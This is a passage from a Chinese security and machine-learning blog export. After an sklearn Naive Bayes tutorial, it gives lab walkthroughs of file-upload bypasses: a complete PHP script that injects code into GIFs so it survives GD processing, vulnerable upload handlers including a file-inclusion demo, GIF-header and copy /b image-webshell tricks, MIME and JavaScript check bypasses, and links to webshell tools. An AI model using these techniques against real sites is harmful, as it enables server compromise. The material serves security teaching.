采用sklearn.datasets模块导入load_iris数据集 123# load the iris dataset from sklearn.datasets import load_iris iris = load_iris() 1.2 存储特征矩阵和响应向量123# store the feature matrix (X) and response vector (y) X = iris.data y = iris.target 1.3 将X和y分为训练和测试集123# splitting X and y into training and testing sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=1) sklearn.model_selection.train_test_split用法 作用：将数组或矩阵拆分为训练集和测试集 语法：sklearn.model_selection.train_test_split(*arrays, **options) train_test_split里面常用的因数（arguments）介绍： arrays：分割对象同样长度的列表或者numpy arrays，矩阵。 test_size：两种指定方法。1：指定小数。小数范围在0.0~0.1之间，它代表test集占据的比例。2：指定整数。整数的大小必须在这个数据集个数范围内，总不能指定一个数超出了数据集的个数范围吧。要是test_size在没有指定的场合，可以通过train_size来指定。（两个是对应关系）。如果train_size也没有指定，那么默认值是0.25. train_size：和test_size相似。 random_state:这是将分割的training和testing集合打乱的个数设定。如果不指定的话，也可以通过numpy.random来设定随机数。 shuffle和straify不常用。straify就是将数据分层。 返回值：将输入列表拆分为训练和测试集 train_test_split 用法举例： 这个数据集 4列，12行 使用pandas模块，制作数据集 123456789101112import pandas as pdfrom sklearn.model_selection import train_test_splitnamelist = pd.DataFrame(&#123; \"name\" : [\"Suzuki\", \"Tanaka\", \"Yamada\", \"Watanabe\", \"Yamamoto\", \"Okada\", \"Ueda\", \"Inoue\", \"Hayashi\", \"Sato\", \"Hirayama\", \"Shimada\"], \"age\": [30, 40, 55, 29, 41, 28, 42, 24, 33, 39, 49, 53], \"department\": [\"HR\", \"Legal\", \"IT\", \"HR\", \"HR\", \"IT\", \"Legal\", \"Legal\", \"IT\", \"HR\", \"Legal\", \"Legal\"], \"attendance\": [1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1] &#125;)namelist .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 0 Suzuki 30 HR 1 1 Tanaka 40 Legal 1 2 Yamada 55 IT 1 3 Watanabe 29 HR 0 4 Yamamoto 41 HR 1 5 Okada 28 IT 1 6 Ueda 42 Legal 1 7 Inoue 24 Legal 0 8 Hayashi 33 IT 0 9 Sato 39 HR 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 将testing数据指定为0.3（test_size=0.3），从而将testing和training 集合分开。 1namelist_train, namelist_test = train_test_split(namelist, test_size=0.3) 1namelist_train .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 3 Watanabe 29 HR 0 5 Okada 28 IT 1 1 Tanaka 40 Legal 1 4 Yamamoto 41 HR 1 10 Hirayama 49 Legal 1 9 Sato 39 HR 1 11 Shimada 53 Legal 1 2 Yamada 55 IT 1 1namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 7 Inoue 24 Legal 0 6 Ueda 42 Legal 1 8 Hayashi 33 IT 0 0 Suzuki 30 HR 1 接下来是将testing数据指定为具体数目。test_size=5 12namelist_train, namelist_test = train_test_split(namelist, test_size=5)namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 0 Suzuki 30 HR 1 1 Tanaka 40 Legal 1 6 Ueda 42 Legal 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 接下来将training data 指定为0.5（training_size=0.5） 12namelist_train, namelist_test = train_test_split(namelist, test_size=None, train_size=0.5)namelist_train .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 7 Inoue 24 Legal 0 6 Ueda 42 Legal 1 5 Okada 28 IT 1 3 Watanabe 29 HR 0 0 Suzuki 30 HR 1 9 Sato 39 HR 1 shuffle功能 12namelist_train, namelist_test = train_test_split(namelist, shuffle=False)namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 9 Sato 39 HR 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 1.4 使用高斯模型训练数据集12345678# training the model on training set #引入高斯朴素贝叶斯from sklearn.naive_bayes import GaussianNB # 实例化gnb = GaussianNB() #训练数据 fit相当于traingnb.fit(X_train, y_train) GaussianNB(priors=None, var_smoothing=1e-09)1.5 测试集预测12# making predictions on the testing set y_pred = gnb.predict(X_test) 1.6 比较预测值和实际值123# comparing actual response values (y_test) with predicted response values (y_pred) from sklearn import metrics print(\"Gaussian Naive Bayes model accuracy(in %):\", metrics.accuracy_score(y_test, y_pred)*100) Gaussian Naive Bayes model accuracy(in %): 93.33333333333333 sklearn.metrics中的评估方法介绍（https://blog.csdn.net/cherdw/article/details/55813071） 1.7 完整代码1234567891011121314151617181920212223# load the iris dataset from sklearn.datasets import load_iris iris = load_iris() # store the feature matrix (X) and response vector (y) X = iris.data y = iris.target # splitting X and y into training and testing sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=1) # training the model on training set from sklearn.naive_bayes import GaussianNB gnb = GaussianNB() gnb.fit(X_train, y_train) # making predictions on the testing set y_pred = gnb.predict(X_test) # comparing actual response values (y_test) with predicted response values (y_pred) from sklearn import metrics print(\"Gaussian Naive Bayes model accuracy(in %):\", metrics.accuracy_score(y_test, y_pred)*100) Gaussian Naive Bayes model accuracy(in %): 93.33333333333333","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"机器学习算法","slug":"人工智能/机器学习算法","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"GaussianNB","slug":"GaussianNB","permalink":"https://fishni.github.io/tags/GaussianNB/"},{"name":"算法","slug":"算法","permalink":"https://fishni.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"【文件上传（五）：高级利用】5.1 图片重绘","slug":"5.1 图片重绘","date":"2020-04-02T16:00:00.000Z","updated":"2020-04-03T09:52:32.347Z","comments":true,"path":"2020/04/03/5.1 图片重绘/","link":"","permalink":"https://fishni.github.io/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/","excerpt":"本文主要内容 重绘图的概念 图片重绘实例分析，PHP输出图像函数","text":"本文主要内容 重绘图的概念 图片重绘实例分析，PHP输出图像函数 0x01 重绘图 应用调用图片库对上传的图片进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用常规方法上传webshell. 如何绕过 将正常图片用目标使用的图像库进行转换 寻找转换前后两次未变的部分 将未变部分替换为欲上传的WebShell 将替换后的文件进行图像文件转换，看是否转换后仍存在替换后部分 比如： 转换前：1233333abcdefg[1111222333]sdas213 转换后：xsadssdddsdddd[1111222333]2313322 0x02 实战练习 参考代码地址https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE 2.1 部署 将参考代码地址项目下载，并放置在windows+phpstudy WWW目录下，并访问，部署完成状态 2.2 上传代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;h2&gt;This is a quick demo to show the process of bypass PHP-GD.&lt;/h2&gt;&lt;h3&gt;Choose image to upload, then \"include $upload_path;\" to show some data.&lt;/h3&gt;&lt;h3&gt;or, use parameter \"file\" to include file, e.g. http://xxxxx/index.php?file=&amp;lt;something&amp;gt;&lt;/h3&gt;&lt;form method=\"POST\" action=\"\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"upfile\" value=\"\"&gt; &lt;input type=\"submit\" value=\"upload\"&gt;&lt;/form&gt;&lt;?phpfunction gd_process($src_img, $dst_img) &#123; try &#123; # you can redefine the GD process $im = imagecreatefromgif($src_img); imagegif($im, $dst_img); &#125; catch (Exception $e) &#123; printf(\"%s\\n\", $e-&gt;getMessage()); return false; &#125; return true;&#125;if (isset($_FILES[\"upfile\"])) &#123; $temp_file = $_FILES['upfile']['tmp_name']; $img_info = getimagesize($temp_file); if ($img_info[2] == '1') &#123; $upload_file = \"test.gif\"; if (!gd_process($temp_file, $upload_file)) &#123; printf(\"Image upload process error, please check out.\\n\"); exit; &#125; printf(\"Path: %s, image upload successful!\\n\", $upload_file); include $upload_file; &#125; else &#123; printf(\"Image type not support in this demo, GIF please...\\n\"); exit; &#125;&#125;if (isset($_REQUEST[\"file\"])) &#123; include $_REQUEST[\"file\"];&#125;?&gt; imagecreatefromgif()函数 由文件或 URL 创建一个新图象 描述：imagecreatefromgif ( string $filename )返回一图像标识符，代表了从给定的文件名取得的图像 PHP 输出图像 imagegif()、imagejpeg()、imagepng() 和 imagewbmp()函数分别允许以 GIF、JPEG、PNG 和 WBMP 格式将图像输出到浏览器或文件。 语法： bool imagegif ( resource image [, string filename] ) bool imagejpeg ( resource image [, string filename [, int quality]] ) bool imagepng ( resource image [, string filename] ) bool imagewbmp ( resource image [, string filename [, int foreground]] ) 参数说明： image 欲输出的图像资源，如 imagecreate() 或 imagecreatefrom 系列函数的返回值 filename 可选，指定输出图像的文件名。如果省略，则原始图像流将被直接输出。 quality 可选，指定图像质量，范围从 0（最差质量，文件最小）到 100（最佳质量，文件最大），默认75 ，imagejpeg() 独有参数 foreground 可选，指定前景色，默认前景色是黑色，imagewbmp() 独有参数 2.3 上传利用copy制作的图片木马 图片demotest.gif 含phpinfo()WebShell，测试结果 分析上传成功的test.gif和demotest.gif 2.4 图片转换代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159&lt;?php/** * Author: rickchen.vip(at)gmail.com * Date: 2015-04-05 * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE * Reference: http://www.secgeek.net/bookfresh-vulnerability/ * Usage: php codeinj.php demo.gif \"&lt;?php phpinfo();?&gt;\" */function gd_process($src_img, $dst_img) &#123; try &#123; # you can redefine the GD process $im = imagecreatefromgif($src_img); imagegif($im, $dst_img); &#125; catch (Exception $e) &#123; printf(\"%s\\n\", $e-&gt;getMessage()); return false; &#125; return true;&#125;function find_similar_block($src_img, $dst_img, $block_len, $slow=false) &#123; $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img)); $dst_data = fread(fopen($dst_img, \"rb\"), filesize($dst_img)); $src_index = 0; $pre_match_array = array(); while ($src_index &lt; (strlen($src_data) - $block_len)) &#123; $find_data = substr($src_data, $src_index, $block_len); $dst_index = 0; $found = false; while ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123; $temp_data = substr($dst_data, $dst_index, $block_len); if (0 === strcmp($find_data, $temp_data)) &#123; $match = array( \"src_offset\" =&gt; $src_index, \"dst_offset\" =&gt; $dst_index ); $pre_match_array[] = $match; $found = true; /* printf(\"Similar block found&gt; src_offset: %d\\n\", $src_index); printf(\" dst_offset: %d\\n\", $dst_index); printf(\" similar_data: %s\\n\", str2hex($temp_data)); printf(\" similar_length: %s\\n\\n\", strlen($temp_data)); */ &#125; if ($found &amp;&amp; $slow == false) $dst_index += $block_len; else $dst_index++; &#125; if ($found &amp;&amp; $slow == false) $src_index += $block_len; else $src_index++; &#125; return $pre_match_array;&#125;function inject_code_to_src_img($src_img, $pre_match_array, $injection_code) &#123; $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img)); $inj_len = strlen($injection_code); $find_n = 0; foreach ($pre_match_array as $similar_block) &#123; #printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len); $mod_src_data = substr($src_data, 0, $similar_block[\"src_offset\"]).$injection_code.substr($src_data, $similar_block[\"src_offset\"] + $inj_len); $temp_img = sys_get_temp_dir().\"/\".$src_img.\".mod\"; $temp_cvt_img = $temp_img.\".gd\"; fwrite(fopen($temp_img, \"wb\"), $mod_src_data); if (!gd_process($temp_img, $temp_cvt_img)) &#123; #printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]); #printf(\" length: %d\\n\\n\", $inj_len); continue; &#125; else &#123; if (check_code($temp_cvt_img, $injection_code)) &#123; $fuck_img = \"gd_\".$src_img; fwrite(fopen($fuck_img, \"wb\"), $mod_src_data); printf(\"Inject code to source image successful with offset: %d\\n\", $similar_block[\"src_offset\"]); printf(\"Saving result \\\"%s\\\", have fun! :)\\n\", $fuck_img); exit; &#125; else &#123; continue; #printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]); &#125; &#125; &#125;&#125;function check_code($src_img, $injection_code) &#123; $data = fread(fopen($src_img, \"rb\"), filesize($src_img)); return strpos($data, $injection_code);&#125;function str2hex($str)&#123; $hex = \"\"; for ($i = 0; $i &lt; strlen($str); $i++)&#123; $hex .= sprintf(\"%02x\", (ord($str[$i])));; &#125; return $hex;&#125;function hex2str($hex)&#123; $str = \"\"; for ($i = 0; $i &lt; strlen($hex)-1; $i+=2)&#123; $str .= chr(hexdec($hex[$i].$hex[$i+1])); &#125; return $str;&#125;/* main */if ($argc &lt; 3) &#123; printf(\"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\\n\", $argv[0]); exit;&#125;$slow = false;$src_img = $argv[1];$injection_code = $argv[2];$img_info = getimagesize($src_img);/* GIF image type value \"1\" */if ($img_info[2] == '1') &#123; $cvt_img = sys_get_temp_dir().\"/\".basename($src_img); if (!gd_process($src_img, $cvt_img)) &#123; printf(\"PHP-GD process() function error, please check out.\\n\"); exit; &#125;&#125; else &#123; printf(\"This script only support GIF image.\\n\"); exit;&#125;$block_len = strlen($injection_code);$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);if (sizeof($pre_match_array)) &#123; inject_code_to_src_img($src_img, $pre_match_array, $injection_code);&#125; else &#123; printf(\"Not found any similar %d bytes block.\\n\", strlen($injection_code));&#125;printf(\"Cant find any useful similar block to inject code, but take it easy. :(\\n\"); 2.5 使用图片转换代码，转换代码 转换操作如图 查看demo.gif,经过转换后的gd_demo.gif 2.6 上传2.5转换后的图片gd_demo.gif 测试结果 再次分析gd_demo.gif和上传成功的test.gif","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"},{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"}]},{"title":"【文件上传（三）：服务端检测绕过】3.4服务端文件内容检测绕过","slug":"3.4 服务端文件内容检测","date":"2020-03-27T16:00:00.000Z","updated":"2020-04-02T10:10:05.784Z","comments":true,"path":"2020/03/28/3.4 服务端文件内容检测/","link":"","permalink":"https://fishni.github.io/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/","excerpt":"本文主要内容 简单文件头检测、文件幻数检测 完整文件结构检测","text":"本文主要内容 简单文件头检测、文件幻数检测 完整文件结构检测 0x01 简单文件头检测 文件幻数检测 JPG ： FF D8 FF E0 00 10 4A 46 49 46 GIF ： 47 49 46 38 39 61 (GIF89a) PNG： 89 50 4E 47 如下图所示代码，是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法。 简单文件头检测测试示例 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = \"uploads/\".rand(10, 99).\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 如果仅在含phpinfo()的文件（phpinfo.php）将其修改为phpinfo.gif是不行的，需在文件内容开头添加gif的文件幻数GIF8a 1GIF89a&lt;?php phpinfo();?&gt; 测试：利用burpsuite截包，repeater重放功能 利用：利用本地文件包含，访问已上传的图片文件（因为图片无法直接被解析） 0x02 完整文件结构检测 通过调用图像函数（如：getimagesize/imagecreatefromgif/imagecreatefrompng）,进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上追加头部起始字节的方法进行绕过。 但是对于getimagesize，如果在文件头追加GIF89a，也是可以成功上传的，但是imagecreatefromgif等无法绕过 2.1 绕过方法 将图片文件与欲上传的文件进行合并绕过检测 copy命令进行文件合并 合并后的文件只要未经过清洗或缩放等操作即可通过检测，并保存欲上传文件的完整性 上传文件的图片部分在解析为PHP时会以乱码显示，建议与尽量小的文件进行合并，否则会有大量乱码 2.2图片一句话木马制作 创建一个文件夹，包含a.bat,tp.gif,yjh.php a.bat内容为cmd；yjh.php内容为&lt;?php phpinfo(): ?&gt; 点击bat文件进入DOS命令，写入”copy tp.gif/b+yjh.php tpyjh.gif” 回车 2.3实战示例 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = isImage($temp_file); if(@imagecreatefromgif($temp_file))&#123; if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = \"uploads/\".rand(10, 99).$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125; &#125;else&#123; $msg=\"文件不是gif图片\"; &#125;&#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 利用burpsuite重放，获取生成的随机图片文件 利用本地文件包含访问图片 0x03 恶意文件内容检测 检测提交内容中是否包含Webshell等数据 推荐使用强混淆的weevely进行尝试，kail中自带https://github.com/sunge/Weevely 或者尝试开源的webshell收集项目https://github.com/tennc/webshell","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（三）：服务端检测绕过】3.1服务端MIME类型检测绕过","slug":"3.1 服务端MIME类型检测绕过","date":"2020-03-26T16:00:00.000Z","updated":"2020-03-31T09:38:30.725Z","comments":true,"path":"2020/03/27/3.1 服务端MIME类型检测绕过/","link":"","permalink":"https://fishni.github.io/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/","excerpt":"本文内容 文件头content-type字段校验（image/gif等）绕过","text":"本文内容 文件头content-type字段校验（image/gif等）绕过 0x01 服务端一般检测的内容 上传的文件名（扩展名、黑白名单） MIME/TYPE （浏览器根据文件扩展名自动生成） 0x02 MIME了解 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。 MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 浏览器会自动根据所上传的文件的扩展名，对应到相应的MIME类型上 常见的白名单MIME/TYPE 0x03 实例分析 环境：windows+phpstudy+burpsuite 由于本地127.0.0.1burpsuite截不到包故采用本地网络地址 测试代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = 'uploads/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; $msg= \"&lt;br/&gt;成功上传至:&lt;b&gt; \".$img_path.\"&lt;/b&gt;\"; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 尝试上传一个含phpinfo的文件（phpinfo.php） 使用burpsuite截断修改content-type，重新提交报文 将burpsuite截断关闭，访问上传的文件","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（二）：前端检测绕过】2.1客户端检测绕过","slug":"2.1 客户端检测绕过","date":"2020-03-25T16:00:00.000Z","updated":"2020-03-31T09:37:09.548Z","comments":true,"path":"2020/03/26/2.1 客户端检测绕过/","link":"","permalink":"https://fishni.github.io/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/","excerpt":"本文主要内容 主要客户端检测绕过类型 前端js检测绕过示例","text":"本文主要内容 主要客户端检测绕过类型 前端js检测绕过示例 0x01 客户端检测绕过（1）JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测。 例如：普通的表单上传（2）Flash AS脚本检测：上传用Flash，提交上传请求前，触发检测用AS脚本进行检测。 例如:DZ的头像上传（3）APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中 客户端检测一般只检测文件扩展名 客户端进行的检测，可通过对客户端代码的一些修改或直接拦截修改报文即可绕过，所以这种上传限制约等于没有 0x02 前端JavaScript检测绕过 查看onchange、onsubmit等事件 onchange事件会在域的内容改变时发生 onsubmit事件会在表单中的确认按钮被点击时发生 删除掉相关事件中的检测函数 0x03 测试案例（1）环境 windows+phpstudy+uploadlab （2）尝试上传含phpinfo()函数的php文件（phpinfo.php） （3）F12审查元素代码，找到事件触发函数 （4）删除onsubmit，重新提交，并访问上传的文件 （5）查看网页源代码可找到上传文件路径相关信息 （6）js校验代码如下 12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt;","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（二）：前端检测绕过】2.2提交报文修改检测","slug":"2.2 提交报文修改检测","date":"2020-03-25T16:00:00.000Z","updated":"2020-03-31T09:37:46.978Z","comments":true,"path":"2020/03/26/2.2 提交报文修改检测/","link":"","permalink":"https://fishni.github.io/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/","excerpt":"本文主要内容 提交报文修改检测 绕过示例","text":"本文主要内容 提交报文修改检测 绕过示例 0x01 提交报文修改检测（前端检测通用） 首先选择正常的文件进行上传 而后通过BurpSuite进行截包改包或改包重放完成文件上传 这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交 0x02 示例（1）环境 （2）选择本地一张含phpinfo()函数的图片（phpinfo.jpg）,使用burpsuite截包 （3）burpsuite进行重放 原始 修改后：","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（一）】1.1文件上传漏洞原理及流程","slug":"1.1 